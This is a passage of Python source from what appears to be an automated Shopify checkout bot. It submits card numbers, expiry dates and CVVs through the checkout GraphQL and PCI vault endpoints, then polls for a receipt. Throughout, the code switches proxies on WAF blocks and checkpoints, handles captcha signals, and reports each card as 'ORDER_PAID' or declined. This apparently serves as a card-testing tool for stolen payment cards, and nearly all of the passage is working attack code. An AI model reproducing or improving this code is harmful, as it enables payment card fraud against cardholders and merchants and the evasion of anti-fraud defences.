                        "consentState": "DECLINED",
                        "countryCode": country_code,
                        "disclosureCountryCode": country_code,
                    },
                    "shopPayOptInPhone": {"countryCode": country_code},
                    "rememberMe": False},
                "tip": {"tipLines": []},
                "taxes": {"proposedAllocations": None,
                          "proposedTotalAmount": {"any": True},
                          "proposedTotalIncludedAmount": None,
                          "proposedMixedStateTotalAmount": None,
                          "proposedExemptions": []},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {"signature": script_sig,
                                      "signatureUuid": script_sig_uuid,
                                      "lineItemScriptChanges": [],
                                      "paymentScriptChanges": [],
                                      "shippingScriptChanges": []},
                "optionalDuties": {"buyerRefusesDuties": False},
            }
            if transformer_fp_v2:
                proposal_variables["transformerFingerprintV2"] = transformer_fp_v2

            proposal_payload = {"variables": proposal_variables,
                                "operationName": "Proposal"}

            response, resp_text = await gql(
                session, "Proposal", headers, proposal_payload, proxy,
                checkout_html=text, checkout_origin=checkout_origin,
                build_id=build_id, profile=profile)

            if resp_text == "Change Proxy":
                return False, "Change Proxy", gateway, variant_price_fallback, currency
            _log_aux_signals("P1", resp_text)
            if is_waf_block(resp_text):
                return False, "Change Proxy (WAF on P1)", gateway, variant_price_fallback, currency
            # ── FIX #6: differentiate CHECKPOINT vs CAPTCHA
            cap_type, cap_solvable = _captcha_signal(resp_text)
            if cap_type == "CHECKPOINT_REQUIRED":
                if cap_solvable:
                    return False, "CHECKPOINT_SOLVABLE", gateway, variant_price_fallback, currency
                return False, "Change Proxy (checkpoint, no data)", gateway, variant_price_fallback, currency
            if cap_type == "CAPTCHA_REQUIRED":
                real_err = extract_real_error_from_text(resp_text)
                return False, f"CAPTCHA: {real_err or 'REQUIRED'}", gateway, variant_price_fallback, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError:
                if _looks_like_connection_error(resp_text):
                    return False, "Change Proxy", gateway, variant_price_fallback, currency
                return False, "Bad proposal#1 response", gateway, variant_price_fallback, currency
            if "errors" in resp_json:
                return False, f"GraphQL Error: {resp_json['errors'][0].get('message', 'unknown')}", \
                       gateway, variant_price_fallback, currency

            result = (resp_json.get("data", {}).get("session", {})
                      .get("negotiate", {}).get("result", {})) or {}
            rtype = result.get("__typename", "")
            if rtype == "CheckpointDenied":
                return False, "Checkpoint Denied", gateway, variant_price_fallback, currency
            if rtype == "Throttled":
                wait = float(result.get("pollAfter") or 2.0)
                await asyncio.sleep(max(wait, 1.5))
                return False, "Throttled", gateway, variant_price_fallback, currency
            if rtype == "NegotiationResultFailed":
                print(f"\n[P1] ❌ NegotiationResultFailed — FULL RESPONSE:")
                print(json.dumps(resp_json, indent=2)[:1500])

                errors = result.get("errors") or []
                for err in errors:
                    print(f"[P1] ⚠️ Error Code: {err.get('code')} | Message: {err.get('localizedMessage')}")

                real_err = extract_real_error_from_text(resp_text)
                return False, real_err or "NEGOTIATION_FAILED", gateway, variant_price_fallback, currency

            checkpoint_data = result.get("checkpointData")
            if result.get("queueToken"):
                queueToken = result["queueToken"]
                headers["x-checkout-queue-token"] = queueToken
                proposal_variables["queueToken"] = queueToken
            if checkpoint_data:
                proposal_variables["checkpointData"] = checkpoint_data

            seller = result.get("sellerProposal") or {}
            _cap = extract_captcha_challenge(seller)
            if _cap and _cap[0] not in (None, "PENDING"):
                print(f"[captcha] ⚠️ P1 captcha provider={_cap[0]}")
                return False, "CARD_DECLINED", gateway, variant_price_fallback, currency

            buyer_prop = result.get("buyerProposal") or {}
            buyer_merch_lines = (buyer_prop.get("merchandise") or {}).get("merchandiseLines") or []
            if buyer_merch_lines and isinstance(buyer_merch_lines[0], dict):
                _bsid = buyer_merch_lines[0].get("stableId")
                if _bsid:
                    negotiated_stable_id = _bsid

            merch_lines = (seller.get("merchandise") or {}).get("merchandiseLines") or []
            if merch_lines and isinstance(merch_lines[0], dict):
                _msid = merch_lines[0].get("stableId")
                if _msid:
                    negotiated_stable_id = _msid

            delivery_data = seller.get("delivery") or {}
            dtype = delivery_data.get("__typename", "")
            _fl = (delivery_data.get("deliveryLines") or [{}])[0] or {}

            _sid = extract_merch_stable_id(_fl)
            if _sid: negotiated_stable_id = _sid

            _rs = extract_requires_shipping(_fl)
            _h, _ = resolve_delivery_strategy(_fl)
            if _h: delivery_strategy = _h

            _is_ship_req = seller.get("isShippingRequired")
            if dtype == "FilledDeliveryTerms" and _is_ship_req is False:
                no_delivery_mode = True
            elif dtype == "FilledDeliveryTerms" and _rs is False:
                no_delivery_mode = True

            print(f"[proposal#1] ⏱{time.time()-t0:.2f}s dtype={dtype!r} "
                  f"strat={delivery_strategy!r} ship_req={_rs} no_delivery={no_delivery_mode}")

            if dtype == "UnavailableTerms":
                print(f"[P1] ⚠️ UnavailableTerms — FULL RESPONSE:")
                print(json.dumps(resp_json, indent=2)[:2000])

            if dtype == "PendingTerms":
                await asyncio.sleep(1.5)
                response, resp_text = await gql(
                    session, "Proposal", headers, proposal_payload, proxy,
                    checkout_html=text, checkout_origin=checkout_origin,
                    build_id=build_id, profile=profile)
                if resp_text == "Change Proxy":
                    return False, "Change Proxy", gateway, variant_price_fallback, currency
                _log_aux_signals("P1-retry", resp_text)
                if is_waf_block(resp_text):
                    return False, "Change Proxy (WAF on P1-retry)", gateway, variant_price_fallback, currency
                _ct, _cs = _captcha_signal(resp_text)
                if _ct == "CHECKPOINT_REQUIRED":
                    if _cs: return False, "CHECKPOINT_SOLVABLE", gateway, variant_price_fallback, currency
                    return False, "Change Proxy (checkpoint)", gateway, variant_price_fallback, currency
                if _ct == "CAPTCHA_REQUIRED":
                    return False, "CARD_DECLINED", gateway, variant_price_fallback, currency
                try:
                    pj = json.loads(resp_text)
                    _r = (pj.get("data", {}).get("session", {})
                          .get("negotiate", {}).get("result", {})) or {}
                    if _r.get("queueToken"):
                        queueToken = _r["queueToken"]
                        headers["x-checkout-queue-token"] = queueToken
                        proposal_variables["queueToken"] = queueToken
                    if _r.get("checkpointData"):
                        checkpoint_data = _r["checkpointData"]
                        proposal_variables["checkpointData"] = checkpoint_data
                    seller = _r.get("sellerProposal") or {}
                    delivery_data = seller.get("delivery") or {}
                    dtype = delivery_data.get("__typename", "")
                    _fl = (delivery_data.get("deliveryLines") or [{}])[0] or {}
                    _h, _ = resolve_delivery_strategy(_fl)
                    if _h: delivery_strategy = _h
                    _sid = extract_merch_stable_id(_fl)
                    if _sid: negotiated_stable_id = _sid
                except Exception:
                    pass

            if no_delivery_mode:
                active_delivery_input = {
                    "deliveryLines": [_delivery_none_line(negotiated_stable_id)],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": True,
                    "prefetchShippingRatesStrategy": None,
                    "interfaceFlow": "SHOPIFY",
                    "supportsSplitShipping": True,
                }
            else:
                delivery_line = {
                    "destination": {"streetAddress": dict(billing_street)},
                    "targetMerchandiseLines": _delivery_target(negotiated_stable_id),
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }
                if delivery_strategy:
                    delivery_line["selectedDeliveryStrategy"] = {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy,
                            "customDeliveryRate": False
                        },
                        "options": {}
                    }
                else:
                    delivery_line["selectedDeliveryStrategy"] = {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    }

                active_delivery_input = {
                    "deliveryLines": [delivery_line],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": True,
                    "prefetchShippingRatesStrategy": None,
                    "interfaceFlow": "SHOPIFY",
                    "supportsSplitShipping": True,
                }

            # ── FIX #2: gap before P2
            await _gql_gap()

            proposal_variables["delivery"] = active_delivery_input
            proposal_variables["payment"]["billingAddress"] = {"streetAddress": dict(billing_street)}
            response, resp_text = await gql(
                session, "Proposal", headers, proposal_payload, proxy,
                checkout_html=text, checkout_origin=checkout_origin,
                build_id=build_id, profile=profile)

            if resp_text == "Change Proxy":
                return False, "Change Proxy", gateway, variant_price_fallback, currency
            _log_aux_signals("P2", resp_text)
            if is_waf_block(resp_text):
                return False, "Change Proxy (WAF on P2)", gateway, variant_price_fallback, currency
            _ct2, _cs2 = _captcha_signal(resp_text)
            if _ct2 == "CHECKPOINT_REQUIRED":
                if _cs2: return False, "CHECKPOINT_SOLVABLE", gateway, variant_price_fallback, currency
                return False, "Change Proxy (checkpoint P2)", gateway, variant_price_fallback, currency
            if _ct2 == "CAPTCHA_REQUIRED":
                return False, "CARD_DECLINED", gateway, variant_price_fallback, currency

            try:
                _dj = json.loads(resp_text)
            except Exception:
                if _looks_like_connection_error(resp_text):
                    return False, "Change Proxy", gateway, variant_price_fallback, currency
                return False, "Delivery parse error", gateway, variant_price_fallback, currency
            if "errors" in _dj:
                return False, f"Delivery error: {_dj['errors'][0].get('message')}", \
                       gateway, variant_price_fallback, currency

            _r2 = (_dj.get("data", {}).get("session", {})
                   .get("negotiate", {}).get("result", {})) or {}
            _s2 = _r2.get("sellerProposal") or {}

            _cap2 = extract_captcha_challenge(_s2)
            if _cap2 and _cap2[0] not in (None, "PENDING"):
                return False, "CARD_DECLINED", gateway, variant_price_fallback, currency

            if _r2.get("queueToken"):
                queueToken = _r2["queueToken"]
                headers["x-checkout-queue-token"] = queueToken
                proposal_variables["queueToken"] = queueToken
            if _r2.get("checkpointData"):
                checkpoint_data = _r2["checkpointData"]
                proposal_variables["checkpointData"] = checkpoint_data

            amt = _extract_amounts_from_seller(_s2)
            checkout_total = amt["checkout_total"]; total_amount = amt["total"]
            payment_identifier = amt["payment_identifier"] or None
            if amt["gateway"]: gateway = amt["gateway"]
            payment_stable_id = amt["payment_stable_id"]
            payment_due_at = amt["payment_due_at"]
            payment_special = amt["payment_special"]

            print(f"[amount] P2: checkout={checkout_total!r} total={total_amount!r}")

            _needs_total_poll = (_positive_amount(checkout_total) is None
                                 and _positive_amount(total_amount) is None)
            if _needs_total_poll:
                for _tp in range(P2_TOTAL_POLL_MAX):
                    await asyncio.sleep(min(1.0 + 0.2 * _tp, 2.5))
                    response, resp_text = await gql(
                        session, "Proposal", headers, proposal_payload, proxy,
                        checkout_html=text, checkout_origin=checkout_origin,
                        build_id=build_id, profile=profile)
                    if resp_text == "Change Proxy":
                        return False, "Change Proxy", gateway, variant_price_fallback, currency
                    _log_aux_signals(f"P2-poll#{_tp+1}", resp_text)
                    if is_waf_block(resp_text):
                        return False, "Change Proxy (WAF on total-poll)", gateway, variant_price_fallback, currency
                    _ctp, _csp = _captcha_signal(resp_text)
                    if _ctp == "CHECKPOINT_REQUIRED":
                        if _csp: return False, "CHECKPOINT_SOLVABLE", gateway, variant_price_fallback, currency
                        return False, "Change Proxy (checkpoint total-poll)", gateway, variant_price_fallback, currency
                    if _ctp == "CAPTCHA_REQUIRED":
                        return False, "CARD_DECLINED", gateway, variant_price_fallback, currency
                    try:
                        _pj = json.loads(resp_text)
                        _r_tp = (_pj.get("data", {}).get("session", {})
                                 .get("negotiate", {}).get("result", {})) or {}
                        _s_tp = _r_tp.get("sellerProposal") or {}
                        if _r_tp.get("queueToken"):
                            queueToken = _r_tp["queueToken"]
                            headers["x-checkout-queue-token"] = queueToken
                            proposal_variables["queueToken"] = queueToken
                        if _r_tp.get("checkpointData"):
                            checkpoint_data = _r_tp["checkpointData"]
                            proposal_variables["checkpointData"] = checkpoint_data
                        amt = _extract_amounts_from_seller(_s_tp)
                        if amt["checkout_total"]: checkout_total = amt["checkout_total"]
                        if amt["total"]: total_amount = amt["total"]
                        if amt["payment_identifier"]: payment_identifier = amt["payment_identifier"]
                        if amt["gateway"]: gateway = amt["gateway"]
                        if amt["payment_stable_id"]: payment_stable_id = amt["payment_stable_id"]
                        if amt["payment_due_at"]: payment_due_at = amt["payment_due_at"]
                        if amt["payment_special"]: payment_special = amt["payment_special"]
                        if _positive_amount(checkout_total) or _positive_amount(total_amount):
                            break
                    except Exception as e:
                        print(f"[amount] poll {_tp+1} parse: {str(e)[:80]}")
                        continue

            final_total = (_positive_amount(checkout_total) or _positive_amount(total_amount))
            if final_total is None:
                return False, "TOTAL_NOT_RESOLVED", gateway, variant_price_fallback, currency
            try: final_total = f"{float(final_total):.2f}"
            except (ValueError, TypeError): pass

            if not payment_identifier:
                return False, "No valid payment method", gateway, final_total, currency

            print(f"[amount] final: total={final_total} {currency}")

            # ── Vault ─────────────────────────────────────────────────────
            cc_digits = _cc_digits(cc)
            cc_spaced = " ".join([cc_digits[i:i+4] for i in range(0, len(cc_digits), 4)])
            vault_payload = {
                "credit_card": {
                    "number": cc_spaced, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None, "start_year": None,
                    "issue_number": "", "name": f"{firstName} {lastName}",
                },
                "payment_session_scope": ourl.replace('https://', '').replace('http://', '').replace('www.', ''),
            }
            vault_referer = (f"https://checkout.pci.shopifyinc.com/build/"
                             f"{pci_build}/number-ltr.html?identifier=&locationURL=")

            vh = {
                "accept": "application/json",
                "content-type": "application/json",
                "origin": "https://checkout.pci.shopifyinc.com",
                "referer": vault_referer,
                "user-agent": ua,
                "sec-ch-ua": profile["sec_ch_ua"],
                "sec-ch-ua-mobile": profile["mobile"],
                "sec-ch-ua-platform": profile["platform"],
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if ident_sig:
                vh["shopify-identification-signature"] = ident_sig

            token = None; last_err = None
            for _attempt in range(2):
                try:
                    r_v = await session.post(
                        "https://checkout.pci.shopifyinc.com/sessions",
                        json=vault_payload, headers=vh, proxy=proxy,
                        timeout=VAULT_TIMEOUT)
                    if r_v.status_code == 429:
                        await asyncio.sleep(_throttle_wait(r_v, 3.0)); continue
                    if r_v.status_code not in (200, 201):
                        last_err = f"PCI HTTP {r_v.status_code}"
                        await asyncio.sleep(0.8); continue
                    try: token = r_v.json().get("id")
                    except Exception:
                        last_err = "PCI bad JSON"; await asyncio.sleep(1.0); continue
                    if token: break
                    last_err = "PCI id missing"; await asyncio.sleep(0.8)
                except Exception as e:
                    last_err = f"PCI error: {e}"; await asyncio.sleep(1.0)
            if not token:
                if last_err and _looks_like_connection_error(last_err):
                    return False, "Change Proxy", gateway, final_total, currency
                return False, last_err or "PCI failed", gateway, final_total, currency
            print(f"[vault] ✅ {time.time()-t0:.2f}s token={token[:30]}...")

            # ── P3 ────────────────────────────────────────────────────────
            p3_line = {
                "paymentMethod": _payment_method_wrapper({
                    "paymentMethodIdentifier": payment_identifier,
                    "sessionId": token,
                    "billingAddress": {"streetAddress": dict(billing_street)},
                    "cardSource": None}),
                "amount": {"any": True}, "dueAt": None,
            }
            proposal_variables["delivery"] = active_delivery_input
            proposal_variables["payment"] = {
                "totalAmount": {"any": True},
                "paymentLines": [p3_line],
                "billingAddress": {"streetAddress": dict(billing_street)},
                "creditCardBin": _cc_bin(cc),
                "allowStoreCredit": False,
            }

            # ── FIX #2: gap before P3
            await _gql_gap()

            response, resp_text3 = await gql(
                session, "Proposal", headers, proposal_payload, proxy,
                checkout_html=text, checkout_origin=checkout_origin,
                build_id=build_id, profile=profile)

            if resp_text3 == "Change Proxy":
                return False, "Change Proxy", gateway, final_total, currency
            _log_aux_signals("P3", resp_text3)
            if is_waf_block(resp_text3):
                return False, "Change Proxy (WAF on P3)", gateway, final_total, currency
            _ct3, _cs3 = _captcha_signal(resp_text3)
            if _ct3 == "CHECKPOINT_REQUIRED":
                if _cs3: return False, "CHECKPOINT_SOLVABLE", gateway, final_total, currency
                return False, "Change Proxy (checkpoint P3)", gateway, final_total, currency
            if _ct3 == "CAPTCHA_REQUIRED":
                return False, "CARD_DECLINED", gateway, final_total, currency

            last_p3_time = time.time()

            try:
                _p3_json = json.loads(resp_text3)
                _p3_result = (_p3_json.get("data", {}).get("session", {})
                              .get("negotiate", {}).get("result", {})) or {}
                if _p3_result.get("queueToken"):
                    queueToken = _p3_result["queueToken"]
                    headers["x-checkout-queue-token"] = queueToken
                    proposal_variables["queueToken"] = queueToken
                if _p3_result.get("checkpointData"):
                    checkpoint_data = _p3_result["checkpointData"]
                    proposal_variables["checkpointData"] = checkpoint_data
                _p3_seller = _p3_result.get("sellerProposal") or {}
                _cap3 = extract_captcha_challenge(_p3_seller)
                if _cap3 and _cap3[0] not in (None, "PENDING"):
                    return False, "CARD_DECLINED", gateway, final_total, currency
                amt3 = _extract_amounts_from_seller(_p3_seller)
                if amt3["payment_identifier"]: payment_identifier = amt3["payment_identifier"]
                if amt3["gateway"]: gateway = amt3["gateway"]
                if amt3["payment_stable_id"]: payment_stable_id = amt3["payment_stable_id"]
                if amt3["payment_due_at"] is not None: payment_due_at = amt3["payment_due_at"]
                if amt3["payment_special"]: payment_special = amt3["payment_special"]
                new_total = (_positive_amount(amt3["checkout_total"])
                             or _positive_amount(amt3["total"]))
                if new_total:
                    try: final_total = f"{float(new_total):.2f}"
                    except (ValueError, TypeError): pass
                print(f"[proposal#3] ✅ {time.time()-t0:.2f}s total={final_total} "
                      f"stableId={payment_stable_id}")
            except Exception as e:
                print(f"[proposal#3] ⚠️ parse: {str(e)[:120]}")

            # ── FIX #5: queueToken freshness check before Submit
            if time.time() - last_p3_time > SUBMIT_FRESH_WINDOW:
                print(f"[submit] queueToken refresh (> {SUBMIT_FRESH_WINDOW}s since P3)")
                await _gql_gap(0.4, 0.9)
                response, resp_text_rf = await gql(
                    session, "Proposal", headers, proposal_payload, proxy,
                    checkout_html=text, checkout_origin=checkout_origin,
                    build_id=build_id, profile=profile)
                if resp_text_rf == "Change Proxy":
                    return False, "Change Proxy", gateway, final_total, currency
                if is_waf_block(resp_text_rf):
                    return False, "Change Proxy (WAF on refresh)", gateway, final_total, currency
                try:
                    _rj = json.loads(resp_text_rf)
                    _r_rf = (_rj.get("data", {}).get("session", {})
                             .get("negotiate", {}).get("result", {})) or {}
                    if _r_rf.get("queueToken"):
                        queueToken = _r_rf["queueToken"]
                        headers["x-checkout-queue-token"] = queueToken
                    if _r_rf.get("checkpointData"):
                        checkpoint_data = _r_rf["checkpointData"]
                except Exception:
                    pass

            # ── Submit ────────────────────────────────────────────────────
            payment_line = {
                "paymentMethod": _payment_method_wrapper({
                    "paymentMethodIdentifier": payment_identifier,
                    "sessionId": token,
                    "billingAddress": {"streetAddress": dict(billing_street)},
                    "cardSource": None}),
                "amount": _money(final_total, currency),
                "dueAt": payment_due_at,
            }
            if payment_stable_id: payment_line["stableId"] = payment_stable_id
            if payment_special: payment_line["specialInstructions"] = payment_special

            payment_block = {
                "totalAmount": {"any": True},
                "paymentLines": [payment_line],
                "billingAddress": {"streetAddress": dict(billing_street)},
                "creditCardBin": _cc_bin(cc),
                "allowStoreCredit": False,
            }

            submit_input = {
                "sessionInput": {"sessionToken": sst},
                "queueToken": queueToken or "",
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": active_delivery_input,
                "merchandise": {"merchandiseLines": [{
                    "stableId": negotiated_stable_id or "1",
                    "merchandise": {"productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponentsSource": None, "lineComponents": []}]},
                "memberships": {"memberships": []},
                "payment": payment_block,
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                    "email": email, "emailChanged": False,
                    "phoneCountryCode": country_code,
                    "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}],
                    "messagingMarketingConsent": {
                        "consentState": "DECLINED",
                        "countryCode": country_code,
                        "disclosureCountryCode": country_code,
                    },
                    "shopPayOptInPhone": {"number": "", "countryCode": country_code},
                    "rememberMe": False},
                "tip": {"tipLines": []},
                "taxes": {"proposedAllocations": None,
                          "proposedTotalAmount": {"any": True},
                          "proposedTotalIncludedAmount": None,
                          "proposedMixedStateTotalAmount": None,
                          "proposedExemptions": []},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "shopPayArtifact": {"optIn": {"vaultEmail": "", "vaultPhone": "",
                                              "optInSource": "REMEMBER_ME"}},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {"signature": script_sig,
                                      "signatureUuid": script_sig_uuid,
                                      "lineItemScriptChanges": [],
                                      "paymentScriptChanges": [],
                                      "shippingScriptChanges": []},
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": [],
            }
            if checkpoint_data:
                submit_input["checkpointData"] = checkpoint_data
            if transformer_fp_v2:
                submit_input["transformerFingerprintV2"] = transformer_fp_v2

            submit_payload = {
                "variables": {
                    "input": submit_input,
                    "attemptToken": attempt_token,
                },
                "operationName": "SubmitForCompletion",
                "query": RAW_SUBMIT_MUTATION
            }

            # ── FIX #2: gap before Submit
            await _gql_gap()
            print(f"[submit] ⏱{time.time()-t0:.2f}s amount={final_total} {currency}")

            raw_url = f"https://{checkout_origin}/checkouts/unstable/graphql"
            try:
                response = await session.post(raw_url, params={"operationName": "SubmitForCompletion"},
                                              headers=headers, json=submit_payload, proxy=proxy, timeout=45)
                submit_text = response.text
            except Exception as e:
                return False, f"Change Proxy", gateway, final_total, currency

            if submit_text == "Change Proxy":
                return False, "Change Proxy", gateway, final_total, currency
            _log_aux_signals("submit", submit_text)
            if is_waf_block(submit_text):
                return False, "Change Proxy (WAF on submit)", gateway, final_total, currency
            _cts, _css = _captcha_signal(submit_text)
            if _cts == "CHECKPOINT_REQUIRED":
                if _css: return False, "CHECKPOINT_SOLVABLE", gateway, final_total, currency
                return False, "Change Proxy (checkpoint submit)", gateway, final_total, currency
            if _cts == "CAPTCHA_REQUIRED":
                return False, "CARD_DECLINED", gateway, final_total, currency

            if ("TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_text
                    or "Your order total has changed" in submit_text
                    or "TOTAL_NEW_TOTAL_MUST_BE_ACCEPTED" in submit_text):
                print(f"[submit] ⛔ tax/total changed — re-fetching P2 and resubmitting")
                await asyncio.sleep(random.uniform(1.2, 1.8))
                response, resp_text = await gql(
                    session, "Proposal", headers, proposal_payload, proxy,
                    checkout_html=text, checkout_origin=checkout_origin,
                    build_id=build_id, profile=profile)
                if resp_text == "Change Proxy":
                    return False, "Change Proxy", gateway, final_total, currency
                _log_aux_signals("tax-retry-proposal", resp_text)
                if is_waf_block(resp_text):
                    return False, "Change Proxy (WAF on tax-retry)", gateway, final_total, currency
                _ctt, _cst = _captcha_signal(resp_text)
                if _ctt == "CHECKPOINT_REQUIRED":
                    if _cst: return False, "CHECKPOINT_SOLVABLE", gateway, final_total, currency
                    return False, "Change Proxy (checkpoint tax-retry)", gateway, final_total, currency
                if _ctt == "CAPTCHA_REQUIRED":
                    return False, "CARD_DECLINED", gateway, final_total, currency
                try:
                    _rj = json.loads(resp_text)
                    _r_rt = (_rj.get("data", {}).get("session", {})
                             .get("negotiate", {}).get("result", {})) or {}
                    _s_rt = _r_rt.get("sellerProposal") or {}
                    if _r_rt.get("queueToken"):
                        queueToken = _r_rt["queueToken"]
                        headers["x-checkout-queue-token"] = queueToken
                    if _r_rt.get("checkpointData"):
                        checkpoint_data = _r_rt["checkpointData"]
                    amt = _extract_amounts_from_seller(_s_rt)
                    new_total = (_positive_amount(amt["checkout_total"])
                                 or _positive_amount(amt["total"]) or final_total)
                    if amt["payment_due_at"] is not None: payment_due_at = amt["payment_due_at"]
                    if amt["payment_stable_id"]: payment_stable_id = amt["payment_stable_id"]
                    if amt["payment_special"]: payment_special = amt["payment_special"]
                    try: final_total = f"{float(new_total):.2f}"
                    except (ValueError, TypeError): pass
                    submit_input["payment"]["totalAmount"] = {"any": True}
                    submit_input["payment"]["paymentLines"][0]["amount"] = _money(final_total, currency)
                    submit_input["payment"]["paymentLines"][0]["dueAt"] = payment_due_at
                    if payment_stable_id:
                        submit_input["payment"]["paymentLines"][0]["stableId"] = payment_stable_id
                    if payment_special:
                        submit_input["payment"]["paymentLines"][0]["specialInstructions"] = payment_special
                    if checkpoint_data:
                        submit_input["checkpointData"] = checkpoint_data
                    if queueToken:
                        submit_input["queueToken"] = queueToken
                    await _gql_gap(0.5, 1.0)
                    response, submit_text = await gql(
                        session, "SubmitForCompletion", headers, submit_payload, proxy,
                        checkout_html=text, checkout_origin=checkout_origin,
                        build_id=build_id, profile=profile)
                    if submit_text == "Change Proxy":
                        return False, "Change Proxy", gateway, final_total, currency
                    _log_aux_signals("submit-tax-retry", submit_text)
                    _cts2, _css2 = _captcha_signal(submit_text)
                    if _cts2 == "CHECKPOINT_REQUIRED":
                        if _css2: return False, "CHECKPOINT_SOLVABLE", gateway, final_total, currency
                        return False, "Change Proxy (checkpoint submit-retry)", gateway, final_total, currency
                    if _cts2 == "CAPTCHA_REQUIRED":
                        return False, "CARD_DECLINED", gateway, final_total, currency
                except Exception as e:
                    print(f"[submit] tax-retry error: {str(e)[:120]}")
                    real_err = extract_real_error_from_text(submit_text)
                    return False, real_err or "TAX_CHANGED", gateway, final_total, currency

            if "The requested payment method is not available." in submit_text:
                return False, "Payment method not available", gateway, final_total, currency

            try:
                sjr = json.loads(submit_text)
            except json.JSONDecodeError:
                if _looks_like_connection_error(submit_text):
                    return False, "Change Proxy", gateway, final_total, currency
                real_err = extract_real_error_from_text(submit_text)
                return False, real_err or "Bad submit response", gateway, final_total, currency
            if "errors" in sjr:
                real_err = extract_real_error_from_text(submit_text)
                return False, real_err or "Submit GraphQL error", gateway, final_total, currency

            submit_data = sjr.get("data", {}).get("submitForCompletion", {}) or {}
            result_type = submit_data.get("__typename", "")

            _receipt = submit_data.get("receipt", {}) or {}
            print(f"[submit] result_type={result_type!r} "
                  f"receipt_typename={_receipt.get('__typename')!r} "
                  f"rid={(str(_receipt.get('id') or ''))[:50]}")

            total_price = final_total
            rid = None
            if result_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt_obj = _receipt
                if receipt_obj.get("__typename") == "ProcessedReceipt":
                    tap = (receipt_obj.get("purchaseOrder") or {}).get("totalAmountToPay") or {}
                    if tap.get("amount") is not None: total_price = str(tap["amount"])
                    if tap.get("currencyCode"): currency = tap["currencyCode"]
                    return True, "ORDER_PAID", gateway, total_price, currency
                rid = receipt_obj.get("id")
            elif result_type == "SubmitRejected":
                _errs = submit_data.get("errors", []) or []
                if _errs:
                    e = _errs[0]
                    code = e.get("code", "") or "SUBMIT_REJECTED"
                    detail = (e.get("localizedMessage")
                              or e.get("nonLocalizedMessage") or e.get("message", ""))
                    if isinstance(detail, dict): detail = json.dumps(detail)
                    return False, (f"{code}: {detail}" if detail else code), \
                           gateway, final_total, currency
                return False, "SUBMIT_REJECTED", gateway, final_total, currency
            elif result_type == "SubmitFailed":
                return False, str(submit_data.get("reason", "SUBMIT_FAILED")), \
                       gateway, final_total, currency
            elif result_type == "TooManyRequests":
                return False, "TOO_MANY_REQUESTS", gateway, final_total, currency
            elif result_type == "Throttled":
                wait = float(submit_data.get("pollAfter") or 2.0)
                await asyncio.sleep(max(wait, 1.5))
                return False, "Throttled", gateway, final_total, currency
            elif result_type == "CheckpointDenied":
                return False, "CheckpointDenied", gateway, final_total, currency

            if not rid:
                real_err = extract_real_error_from_text(submit_text)
                return False, real_err or f"No receipt ({result_type})", \
                       gateway, final_total, currency

            # ── Poll ──────────────────────────────────────────────────────
            poll_payload = {
                "variables": {"receiptId": rid},
                "operationName": "PollForReceipt",
                "query": RAW_POLL_QUERY,
            }
            print(f"[poll] receipt rid={rid[:40] if rid else 'None'}")

            last_server_delay = None
            consecutive_429 = 0
            for i in range(RECEIPT_POLL_MAX + 2):
                if i == 0:
                    await asyncio.sleep(2.0)
                else:
                    if last_server_delay is not None:
                        await asyncio.sleep(last_server_delay + 0.2)
                    else:
                        await asyncio.sleep(min(1.2 + 0.35 * i, 3.5))

                try:
                    poll_resp = await session.post(raw_url, headers=headers, json=poll_payload, proxy=proxy, timeout=20)
                    final_text = poll_resp.text
                    response = poll_resp
                except Exception:
                    final_text = '{"errors":[{"message":"poll timeout"}]}'
                    response = None

                if final_text == "Change Proxy":
                    return False, "Change Proxy", gateway, total_price, currency
                if response is not None and response.status_code == 429:
                    # ── FIX #4: exponential backoff on repeated 429
                    consecutive_429 += 1
                    wait = _backoff_wait(consecutive_429, base=RECEIPT_POLL_DELAY, cap=8.0)
                    await asyncio.sleep(wait)
                    continue
                consecutive_429 = 0
                _log_aux_signals(f"poll#{i+1}", final_text)
                if is_waf_block(final_text):
                    print(f"[poll] ⚠️ WAF on poll {i+1}")
                    await asyncio.sleep(3.5)
                    continue
                try:
                    pj = json.loads(final_text)
                except json.JSONDecodeError:
                    if _looks_like_connection_error(final_text):
                        return False, "Change Proxy", gateway, total_price, currency
                    if is_captcha_required(final_text):
                        return False, "CARD_DECLINED", gateway, total_price, currency
                    continue

                rd = pj.get("data", {}).get("receipt", {}) or {}
                if isinstance(rd, dict) and rd.get("pollDelay") is not None:
                    try: last_server_delay = float(rd["pollDelay"]) / 1000.0
                    except (ValueError, TypeError): pass

                tn = rd.get("__typename", "")
                print(f"[poll] {i+1} type={tn}")
                if tn == "ProcessedReceipt":
                    tap = (rd.get("purchaseOrder") or {}).get("totalAmountToPay") or {}
                    if tap.get("amount") is not None: total_price = str(tap["amount"])
                    if tap.get("currencyCode"): currency = tap["currencyCode"]
                    return True, "ORDER_PAID", gateway, total_price, currency
                if tn == "FailedReceipt":
                    err = rd.get("processingError", {}) or {}
                    raw_code = err.get("code", "") or "PAYMENT_FAILED"
                    msg = (err.get("messageUntranslated") or err.get("message") or "")
                    if isinstance(msg, dict): msg = json.dumps(msg)
